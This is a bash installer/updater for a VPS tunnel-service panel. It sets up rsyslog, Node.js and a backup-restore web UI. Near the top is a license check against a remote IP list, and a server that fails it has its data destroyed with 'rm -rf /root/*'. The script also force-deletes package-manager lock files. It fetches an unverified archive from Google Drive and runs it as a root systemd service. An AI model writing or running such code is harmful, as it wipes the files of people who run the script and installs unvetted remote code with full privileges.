#!/bin/bash
MYIP=$(cat /usr/bin/.ipvps)
IZIN=$(curl -sL "https://raw.githubusercontent.com/nameless-newbie/fifth-sc/main/izin/ip")
ALLOWED_IP=$(curl -sS "$IZIN" | grep "$MYIP" | awk '{print $4}')
if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
    echo -n
else
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
echo -e "\033[41;1m ⚠️       ACCESS DENIED         ⚠️ \033[0m"
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
echo -e ""
echo -e "        \033[91;1m❌ SCRIPT LOCKED ❌\033[0m"
echo -e ""
echo -e "  \033[0;33m🔒 Your VPS\033[0m $MYIP \033[0;33mHas been Banned\033[0m"
echo -e ""
echo -e "  \033[91m⚠️  Active Period Has Expired ⚠️\033[0m"
echo -e "  \033[0;33m💡 Purchase official licenses only from the Admin!\033[0m"
echo -e ""
echo -e "  \033[92;1m📞 Contact Admin:\033[0m"
echo -e "  \033[96m🌍 Telegram: https://t.me/kuzavpn[0m"
echo -e "  \033[96m📱 WhatsApp: https://wa.me/628971173434[0m"
echo -e ""
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
rm -rf /root/*
exit 1
        fi
loading() {
    local pid=$1
    local message=$2
    local delay=0.1
    local spinstr='|/-\'
    tput civis
    while [ -d /proc/$pid ]; do
        local temp=${spinstr#?}
        printf " [%c] $message\r" "$spinstr"
        spinstr=$temp${spinstr%"$temp"}
        sleep $delay
    done
    tput cnorm
}
detect_os() {
  if [[ -f /etc/os-release ]]; then
    source /etc/os-release
    echo "$ID $VERSION_ID"
  else
    echo "Unknown"
  fi
}
os_version=$(detect_os)
if [[ "$os_version" =~ ubuntu\ 2(4|5)\.[0-9]+ ]]; then
  RSYSLOG_FILE="/etc/rsyslog.d/50-default.conf"
elif [[ "$os_version" == "debian 12" ]]; then
  RSYSLOG_FILE="/etc/rsyslog.conf"
else
  echo "Operating system or version not recognized. Exit..."
  exit 1
fi
LOG_FILES=(
  "/var/log/auth.log"
  "/var/log/kern.log"
  "/var/log/mail.log"
  "/var/log/user.log"
  "/var/log/cron.log"
)
set_permissions() {
  for log_file in "${LOG_FILES[@]}"; do
    if [[ -f "$log_file" ]]; then
      echo "Managing permissions and ownership for $log_file..."
      chmod 640 "$log_file"
      chown syslog:adm "$log_file"
    else
      echo "$log_file not found, skipping..."
    fi
  done
}
check_dropbear_log() {
  grep -q 'if \$programname == "dropbear"' "$RSYSLOG_FILE"
}
add_dropbear_log() {
  echo "Adding Dropbear configuration to  $RSYSLOG_FILE..."
  sudo bash -c "echo -e 'if \$programname == \"dropbear\" then /var/log/auth.log\n& stop' >> $RSYSLOG_FILE"
  systemctl restart rsyslog
  echo "The Dropbear configuration was added and Rsyslog was restarted."
}
if [[ $(ls /var/lib/dpkg/ | grep -c "lock") -gt 0 ]]; then
        rm /var/lib/dpkg/lock* &> /dev/null
        rm /var/lib/dpkg/stato* &> /dev/null
fi

if ! command -v gdown &> /dev/null; then
    if grep -Ei 'ubuntu 24|ubuntu 25|linux 12' /etc/os-release &> /dev/null; then
        apt update -y &> /dev/null && apt install -y python3-full python3-pip &> /dev/null
                pip install --break-system-packages gdown &> /dev/null
    else
        apt update -y &> /dev/null && apt install -y python3-pip &> /dev/null
        pip install gdown &> /dev/null
    fi
fi
if ! command -v 7z &> /dev/null; then
    echo -e " [INFO] Installing p7zip-full..."
    apt install p7zip-full -y &> /dev/null &
    loading $! "Loading Install p7zip-full"
fi
if ! command -v sshpass &> /dev/null; then
    echo -e " [INFO] Installing sshpass..."
    apt install sshpass -y &> /dev/null &
    loading $! "Loading Install sshpass"
fi
if ! command -v speedtest-cli &> /dev/null; then
    echo -e " [INFO] Installing speedtest-cli..."
    apt  install speedtest-cli -y &> /dev/null &
    loading $! "Loading Install SpeedTest"
fi
    NODE_VERSION=$(node -v 2>/dev/null | grep -oP '(?<=v)\d+' || echo "0")
    rm /var/lib/dpkg/stato*
    rm /var/lib/dpkg/lock*

    if [ "$NODE_VERSION" -lt 22 ]; then
        echo -e "${yellow}Installing or upgrading Node.js to version 22...${neutral}"
        curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash - || echo -e "${red}Failed to download Node.js setup${neutral}"
        apt-get install -y nodejs || echo -e "${red}Failed to install Node.js${neutral}"
        npm install -g npm@latest
    else
        echo -e "${green}Node.js is already installed and up-to-date (v$NODE_VERSION), skipping...${neutral}"
    fi
check_and_install_gawk() {
    if ls -l /etc/alternatives/awk | grep -q "/usr/bin/mawk"; then
        echo -e "[INFO] mawk terdeteksi, mengganti ke gawk..."
        if ! command -v gawk &> /dev/null; then
            echo -e "[INFO] Installing gawk..."
            apt update &> /dev/null && apt install gawk -y &> /dev/null
        fi
        if command -v gawk &> /dev/null; then
            echo -e "[INFO] gawk installed. Set gawk as the default awk..."
            ln -sf $(which gawk) /usr/bin/awk
        else
            echo -e "[ERROR] Failed to install gawk. Update stopped."
            exit 1
        fi
    else
        echo -e "[INFO] awk already uses gawk or is compatible."
    fi
}
updatewebui() {
cd /opt
gdown --id 1m4gIPAWVsQ2h4ySNukPeWJWp3IlfHak2 -O backup-restore-ui.zip
unzip -o backup-restore-ui.zip
rm backup-restore-ui.zip && cd backup-restore-ui
npm install
cd
cat <<EOF > /etc/systemd/system/restore-ui.service
[Unit]
Description=Backup Restore Web UI Service By Newbie
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/node /opt/backup-restore-ui/server.js
WorkingDirectory=/opt/backup-restore-ui
Restart=always
RestartSec=5
User=root
Environment=NODE_ENV=production

[Install]
WantedBy=multi-user.target

EOF
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable restore-ui
systemctl start restore-ui
}
if check_dropbear_log; then
  echo "The Dropbear configuration is already in place, no changes have been made."
else
  add_dropbear_log
fi
set_permissions
updatewebui
check_and_install_gawk